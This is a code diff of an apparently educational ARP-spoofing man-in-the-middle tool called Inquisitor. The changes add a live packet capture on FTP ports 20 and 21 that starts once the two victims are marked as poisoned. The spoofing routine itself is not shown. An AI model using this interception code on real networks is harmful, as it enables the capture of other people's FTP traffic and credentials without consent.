@@ -28,14 +28,15 @@ class Inquisitor:
 
         self.interface = "enp0s3"
         self.ouput_file = get_output_file_name()
+
         self.threading()
 
     #! ALL PROCESS HANDLER
 
     def threading(self):
-        thread_request = threading.Thread(target=self.arp_listener, daemon=True, name="ARP Listener")
-        thread_reply = threading.Thread(target=self.arp_replier, daemon=True, name="ARP Replier")
-        thread_capture = threading.Thread(target=self.ftp_listener, daemon=True, name="FTP Listener")
+        thread_request = threading.Thread(target=self.arp_listener, daemon=False, name="ARP Listener")
+        thread_reply = threading.Thread(target=self.arp_replier, daemon=False, name="ARP Replier")
+        thread_capture = threading.Thread(target=self.ftp_listener, daemon=False, name="FTP Listener")
         
         thread_request.start()
         thread_reply.start()
@@ -47,19 +48,44 @@ class Inquisitor:
         while not self.source.poisoned or not self.target.poisoned:
             threading_end_event.wait(5)
         log_warning("Starting FTP capture...")
-        while not threading_end_event.is_set():
-            threading_end_event.wait(0.5)
-        pass
+        
+        if threading_end_event.is_set():
+            log_warning("FTP listener stopped before poisoning was complete due to shutdown event.")
+            return
+
+        # cap_ftp = None
+
+        try:
+            cap_ftp = pcapy.open_live(self.interface, 65535, True, 100)
+            cap_ftp.setfilter("tcp port 21 or tcp port 20")
+        
+            while not threading_end_event.is_set():
+                header, packet = cap_ftp.next()
+                if header is not None and packet is not None:
+                    process_ftp_packet(header, packet)
+
+                #! ADD PROCESS OF FTP PACKET
+
+        except pcapy.PcapError as e:
+            log_error(f"Pcapy error during capture: {e}")
+            log_error("Make sure to run the script with root privileges (sudo).")
+            log_error(f"Check that the interface '{self.interface}' exists and is operational.")
+        except Exception as e:
+            log_error(f"An unexpected error occurred in the looking_for_arp_requests function: {e}")
+        # finally:
+        #     if cap_ftp:
+        #         cap_ftp.close()
 
     def arp_listener(self):
         count = 0
         priting_machines(self, count)
+        cap_arp = None
 
         try:
-            cap = pcapy.open_live(self.interface, 65535, True, 100)
-            cap.setfilter("arp")
+            cap_arp = pcapy.open_live(self.interface, 65535, True, 100)
+            cap_arp.setfilter("arp")
             while True:
-                header, packet = cap.next()
+                header, packet = cap_arp.next()
                 if header is not None and packet is not None:
                    sender_mac, sender_ip, target_mac, target_ip = process_request_packet(header, packet, self)
                 
@@ -74,15 +100,17 @@ class Inquisitor:
                 if self.source.poisoned and self.target.poisoned:
                     break
                   
-        except KeyboardInterrupt:
-            log_warning("Listening for ARP requests stopped by user.")
+        # except KeyboardInterrupt:
+        #     log_warning("Listening for ARP requests stopped by user.")
         except pcapy.PcapError as e:
             log_error(f"Pcapy error during capture: {e}")
             log_error("Make sure to run the script with root privileges (sudo).")
             log_error(f"Check that the interface '{self.interface}' exists and is operational.")
         except Exception as e:
             log_error(f"An unexpected error occurred in the looking_for_arp_requests function: {e}")
-        pass
+        # finally:
+        #     if cap_arp:
+        #         cap_arp.close()
 
     def arp_replier(self):
         switch = False
